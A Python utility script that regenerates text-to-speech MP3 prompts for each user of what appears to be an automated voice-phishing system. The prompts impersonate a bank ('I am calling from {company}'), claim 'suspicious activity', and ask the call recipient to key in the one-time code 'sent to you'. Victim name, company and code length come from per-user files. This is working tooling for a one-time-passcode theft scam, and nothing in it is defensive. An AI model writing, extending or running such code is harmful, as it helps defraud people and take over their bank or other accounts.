"""
Regenerate all missing MP3 files for all users.
Run this if MP3s are missing.
"""

import sys
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from core.files import read_user_file
from services.tts_service import generate_ai, get_default_voice_id


def regenerate_all_mp3s():
    print("🔄 REGENERATING MP3 FILES")
    print("=" * 60)
    
    conf_path = Path("conf")
    if not conf_path.exists():
        print("❌ conf/ directory not found")
        return
    
    user_dirs = [d for d in conf_path.iterdir() if d.is_dir()]
    print(f"📁 Found {len(user_dirs)} user directories")
    
    regenerated = 0
    for user_dir in user_dirs:
        user_id = user_dir.name
        print(f"\n👤 User: {user_id}")
        
        voice_id = read_user_file(user_id, "Voice.txt", "")
        if not voice_id:
            print("  ⚠️  No voice ID, using default")
            voice_id = get_default_voice_id()
        
        for page in ["checkifhuman", "explain", "askdigits"]:
            mp3_path = user_dir / f"{page}.mp3"
            if not mp3_path.exists():
                print(f"  🎵 Generating: {page}.mp3")
                try:
                    if page == "checkifhuman":
                        name = read_user_file(user_id, "Name.txt", "Customer")
                        company = read_user_file(user_id, "Company Name.txt", "your bank")
                        text = f"Hello, I am calling from {company}. Please press 1 to confirm you are {name}."
                    elif page == "explain":
                        name = read_user_file(user_id, "Name.txt", "Customer")
                        text = f"Thank you for confirming, {name}. We have detected suspicious activity and need to verify some details."
                    else:
                        digits = read_user_file(user_id, "Digits.txt", "6")
                        text = f"Please enter the {digits} digit code sent to you using your keypad."
                    
                    if generate_ai(user_id, text, page, voice_id):
                        regenerated += 1
                        print(f"  ✅ Generated: {page}.mp3")
                    else:
                        print(f"  ❌ Failed: {page}.mp3")
                except Exception as e:
                    print(f"  ❌ Error generating {page}.mp3: {e}")
            else:
                print(f"  ✅ Already exists: {page}.mp3")
    
    print(f"\n✅ Regenerated {regenerated} MP3 files")


if __name__ == "__main__":
    regenerate_all_mp3s()
